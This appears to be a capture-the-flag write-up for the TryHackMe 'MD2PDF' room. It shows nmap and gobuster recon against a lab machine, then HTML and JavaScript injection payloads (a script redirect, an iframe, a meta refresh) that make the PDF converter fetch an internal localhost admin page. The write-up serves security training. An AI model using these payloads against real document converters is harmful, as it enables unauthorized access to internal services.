## INTRODUCTION

Hello Hacker!

TopTierConversions LTD is proud to announce its latest and greatest product launch: MD2PDF.

This easy-to-use utility converts markdown files to PDF and is totally secure! Right...? 

This an easy rated room in tryhackme exploiting pdf xss.

The challenge can be foud here. <https://tryhackme.com/room/md2pdf>

## Initial recon - Port scanning

The first step is to conduct a port scan to identify open ports and the services that are running on those ports. Lets run nmap.

```shell
nmap -sC 10.10.26.251 -o nmap.out
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-24 07:28 EAT
Nmap scan report for 10.10.26.251
Host is up (0.15s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   3072 cd:bd:77:b7:fd:a3:fc:9e:f5:bd:74:30:61:74:2f:24 (RSA)
|   256 0f:f5:6f:f8:39:38:47:a5:89:87:dc:61:3e:4f:8c:32 (ECDSA)
|_  256 67:3e:8a:79:5d:83:12:e6:65:42:11:07:62:15:1e:d2 (ED25519)
80/tcp   open  http
|_http-title: MD2PDF
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 41.90 seconds
            
```

## Directory Scanning

Let's scan for directories using gobuster.
```shell
 gobuster dir -u http://10.10.26.251/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

/convert              (Status: 405) [Size: 178]

```

## Checking ot the Directories

There is a `/admin` directory. Upon visiting this directory, there is some interesting information. It s only accessible through localhost:5000/admin

## Test for XSS 

To test for this we go back to the root directory http://10.10.26.251/ . Here we have to establish acces to localhost:5000/admin. 

I try some payoads to seee if we have anything interesting.


`<script>alert(1)</script>`

 
All the above are just giving a blank screen instead of fetching the flag. However, it tells us we are close but have to adjust our payloads.

`<script>document.write(document.location.href)</script>`  returns something interesting.

After trying multiple techniques, I employ a new technique.


## Javascript Code Injection
Let's check the page source for clues.

I can try to tell the script to redirect me to the admin directory.
I finally manage to get working scripts and the fetch the flag. :)


```shell
<script>
    window.location.href = 'http://localhost:5000/admin';
</script>
```


```shell
<iframe src="http://localhost:5000/admin" height="1000" width="1000">
</iframe>
```


```shell
<meta http-equiv="refresh" content="0;URL='http://localhost:5000/admin'">
```
And we have the flag.
